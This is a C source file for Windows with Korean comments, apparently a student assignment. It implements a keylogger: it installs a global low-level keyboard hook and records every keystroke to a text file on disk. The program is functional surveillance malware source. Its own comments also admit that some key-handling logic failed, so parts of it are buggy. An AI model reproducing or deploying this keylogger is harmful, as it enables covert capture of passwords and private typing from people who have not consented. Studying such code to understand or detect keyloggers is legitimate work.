#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>

HHOOK hHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	FILE* fp;
	fp = fopen("D:\\COM\\P4C\\W6\\keylog.txt", "at");	//"keylog.txt" 파일에 로그 저장

	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
	{
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;

		if (nCode >= 0 && (int)wParam == 256)	//프로세스에 메시지가 있는 경우
		{
			if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (GetAsyncKeyState(VK_RCONTROL) & 0x8000))	//방금 ctrl이 눌린 상태
			{
				printf("Ctrl + ");
				fprintf(fp, "Ctrl + \n");
			}
			else if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000))	//방금 shift가 눌린 상태
			{
				printf("Shift + ");
				fprintf(fp, "Shift + \n");
			}
					
			if ((GetAsyncKeyState(VK_LCONTROL) != 0x8000) & VK_LCONTROL == pKey->vkCode || VK_RCONTROL == pKey->vkCode)	//ctrl 중복출력을 막아보려 했으나 실패
			{
				printf("Ctrl \n");
				fprintf(fp, "Crtl \n");
			}
			else if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) & VK_LSHIFT == pKey->vkCode || VK_RSHIFT == pKey->vkCode)	//shift 중복출력을 막아보려 했으나 실패
			{
				printf("Shift \n");
				fprintf(fp, "Shift \n");
			}
			else if (VK_RETURN == pKey->vkCode)
			{
				printf("Enter \n");
				fprintf(fp, "Enter \n");
			}
			else if (VK_SPACE == pKey->vkCode)
			{
				printf("Space \n");
				fprintf(fp, "Space \n");
			}
			else if (VK_BACK == pKey->vkCode)
			{
				printf("Backspace \n");
				fprintf(fp, "Backspace \n");
			}
			else if (VK_MENU == pKey->vkCode)
			{
				printf("Alt \n");
				fprintf(fp, "Alt \n");
			}
			else if (VK_CAPITAL == pKey->vkCode)
			{
				printf("CAPS LOCK \n");
				fprintf(fp, "CAPS LOCK \n");
			}
			else if (VK_TAB == pKey->vkCode)
			{
				printf("Tab \n");
				fprintf(fp, "Tab \n");
			}
			else if (VK_ESCAPE == pKey->vkCode)
			{
				printf("Escape \n");
				fprintf(fp, "Escape \n");
			}
			else if (VK_LWIN == pKey->vkCode)
			{
				printf("Windows \n");
				fprintf(fp, "Windows \n");
			}
			else   //그외 문자들(숫자, 알파벳)
			{
				printf("%c \n", pKey->vkCode);
				fprintf(fp, "%c \n", pKey->vkCode);
			}
		}
	}

	CallNextHookEx(hHook, nCode, wParam, lParam);	//nCode < 0 : 프로세스에 메시지가 없을 경우

	fclose(fp);

	return 0;
}

int main()
{
	HMODULE hInstance = GetModuleHandle(NULL);	//자신의 module값을 가져온다.

	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, NULL);	//후킹 프로시저를 설치

	MSG msg;
	GetMessage(&msg, NULL, NULL, NULL);	//메시지 큐에 메시지가 있으면 MSG구조체에 저장하고 TRUE 반환하며, WM_QUIT일 경우 FALSE를 반환한다.

	UnhookWindowsHookEx(hHook);	//설치된 후킹 프로시저를 제거

	return 0;
}